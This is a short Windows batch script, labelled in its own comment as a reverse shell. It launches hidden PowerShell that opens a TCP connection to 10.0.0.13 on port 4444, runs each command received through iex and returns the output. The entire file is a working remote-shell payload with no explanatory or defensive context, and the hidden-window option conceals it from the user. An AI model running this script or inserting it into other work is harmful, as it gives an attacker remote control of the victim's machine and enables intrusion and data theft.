@echo off
REM Batch reverse shell - launches an inline PowerShell TCPClient payload
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('10.0.0.13',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=([text.encoding]::ASCII).GetBytes($r);$s.Write($rb,0,$rb.Length);$s.Flush()};$c.Close()"
